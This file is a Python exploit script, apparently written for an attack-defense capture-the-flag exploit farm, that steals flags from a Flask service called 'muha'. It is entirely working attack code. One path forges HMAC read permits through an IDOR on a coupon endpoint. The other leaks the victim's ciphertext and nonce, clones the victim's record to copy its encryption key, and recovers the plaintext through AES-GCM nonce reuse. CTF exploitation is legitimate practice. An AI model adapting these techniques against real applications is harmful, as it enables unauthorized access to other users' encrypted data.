"""Farm exploit for the `muha` service (real Team7 range box, Python/Flask).

Service = "fly brain lab": users own flies, flies hold AES-GCM-encrypted memories;
the checker plants the flag as a memory's `content`. flag_id (from attack_data) is
the public memory id (`mid`) of the flagged memory.

Two independent steal paths (whichever the target team has NOT patched), tried in
order; both need only a freshly registered account and the public interface:

  A) COUPON-FORGE IDOR (fast, ~3 req).  POST /api/coupons signs an HMAC read-permit
     for ANY object_id supplied by the caller without checking ownership; then
     POST /api/memories/<mid>/read accepts that permit (subject==caller, object_id==mid)
     and returns the decrypted content. => forge a permit for the victim's mid, read it.

  B) CAPSULE + CLONE + AES-GCM NONCE REUSE (crypto fallback, ~5 req).
     GET /api/memories/<mid>/capsule leaks the victim's ciphertext + nonce (nonce =
     fly counter at store time). POST /api/flies/<victim_fid>/clone has NO ownership
     check and copies the victim's per-fly brain_key into a fly we own, with counter
     set to `revision` (we pick it = R, the victim memory's index). Storing our own
     memory in that clone encrypts a KNOWN plaintext under the SAME (key, nonce),
     so keystream = P1 XOR C1, and flag = C_victim XOR keystream.

Interface frozen by the farm:  exploit(host, port, flag_id) -> list[str]
Standalone:  python muha.py <host> <port> <flag_id>
"""
import base64
import re
import secrets
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
MID_RE = re.compile(r"^[0-9a-f]{24}$")
TIMEOUT = 5
MAX_DUMP_MEMORIES = 20          # cap for flag_id-less dump-all (stay under farm timeout)


def _rand(n=16):
    return secrets.token_hex(n // 2 + 1)[:n]


def _unb64(value):
    # muha emits urlsafe base64 without padding (b64 = urlsafe_b64encode(...).rstrip("="))
    s = str(value)
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def _session(base):
    """Register a throwaway account; returns a requests.Session with its cookie, or None."""
    s = requests.Session()
    u, p = "lab" + _rand(10), _rand(20)
    try:
        r = s.post(base + "/api/register", json={"username": u, "password": p}, timeout=TIMEOUT)
        if r.status_code not in (200, 201):
            # username clash or already-registered edge: try logging in
            r = s.post(base + "/api/login", json={"username": u, "password": p}, timeout=TIMEOUT)
            if r.status_code != 200:
                return None
    except requests.RequestException:
        return None
    return s


def _make_fly(s, base):
    try:
        r = s.post(base + "/api/flies", json={"name": _rand(8), "profession": "qa"}, timeout=TIMEOUT)
        if r.status_code == 201:
            return r.json().get("id")
    except (requests.RequestException, ValueError):
        pass
    return None


def _memories_of(s, base, fid):
    try:
        r = s.get(base + "/api/flies/%s/memories" % fid, timeout=TIMEOUT)
        if r.status_code == 200:
            return [m["id"] for m in r.json().get("memories", []) if m.get("id")]
    except (requests.RequestException, ValueError, KeyError):
        pass
    return []


def _public_flies(s, base):
    try:
        r = s.get(base + "/api/flies", params={"scope": "public"}, timeout=TIMEOUT)
        if r.status_code == 200:
            return [f["id"] for f in r.json().get("flies", []) if f.get("id")]
    except (requests.RequestException, ValueError, KeyError):
        pass
    return []


def _path_a(s, base, my_fid, mid):
    """Coupon-forge IDOR: sign a permit for the victim mid, then read it."""
    if not my_fid:
        return None
    try:
        r = s.post(base + "/api/coupons", json={"fly_id": my_fid, "object_id": mid}, timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        token = r.json().get("token")
        if not token:
            return None
        r = s.post(base + "/api/memories/%s/read" % mid, json={"token": token}, timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        return r.json().get("content")
    except (requests.RequestException, ValueError, KeyError):
        return None


def _path_b(s, base, mid):
    """capsule leak + clone (brain_key copy) + AES-GCM nonce reuse -> recover plaintext."""
    try:
        r = s.get(base + "/api/memories/%s/capsule" % mid, timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        j = r.json()
        victim_fid = j["fly_id"]
        nonce = _unb64(j["nonce"])
        ct_victim = _unb64(j["ciphertext"])          # ciphertext already excludes the 16-byte tag
        revision = int.from_bytes(nonce, "big")       # nonce == fly counter at store time == mem index

        r = s.post(base + "/api/flies/%s/clone" % victim_fid,
                   json={"name": _rand(8), "revision": revision}, timeout=TIMEOUT)
        if r.status_code != 201:
            return None
        my_fid = r.json()["id"]

        p1 = "A" * min(4096, max(256, len(ct_victim) + 32))   # known plaintext (<=4096 content cap)
        r = s.post(base + "/api/flies/%s/memories" % my_fid,
                   json={"title": "k", "content": p1}, timeout=TIMEOUT)
        if r.status_code != 201:
            return None
        my_mid = r.json()["id"]

        r = s.get(base + "/api/memories/%s/capsule" % my_mid, timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        ct_mine = _unb64(r.json()["ciphertext"])
        ks = _xor(p1.encode(), ct_mine)               # keystream = P1 XOR C1 (same key+nonce)
        return _xor(ct_victim, ks).decode("utf-8", "ignore")
    except (requests.RequestException, ValueError, KeyError, TypeError):
        return None


def _harvest(text, out):
    if not text:
        return
    for m in FLAG_RE.findall(text):
        out.add(m)


def exploit(host, port, flag_id):
    base = "http://%s:%d" % (host, int(port))
    flags = set()

    s = _session(base)
    if s is None:
        return []
    my_fid = _make_fly(s, base)                        # needed for path A (coupon fly_id ownership)

    # Build the candidate memory-id list.
    mids = []
    if flag_id and MID_RE.match(str(flag_id)):
        mids.append(str(flag_id))                      # flag_id is most likely the memory id
        mids.extend(_memories_of(s, base, str(flag_id)))   # ...or a fly id: pull its memories too
    else:
        for fid in _public_flies(s, base):
            mids.extend(_memories_of(s, base, fid))

    seen = set()
    for mid in mids:
        if mid in seen:
            continue
        seen.add(mid)
        if len(seen) > MAX_DUMP_MEMORIES and not (flag_id and MID_RE.match(str(flag_id))):
            break
        content = _path_a(s, base, my_fid, mid)
        if not content or not FLAG_RE.search(content):
            content = _path_b(s, base, mid)
        _harvest(content, flags)
        if flag_id and flags:                          # targeted call: stop as soon as we have it
            break

    return list(flags)


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    pt = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, pt, fid):
        print(f)
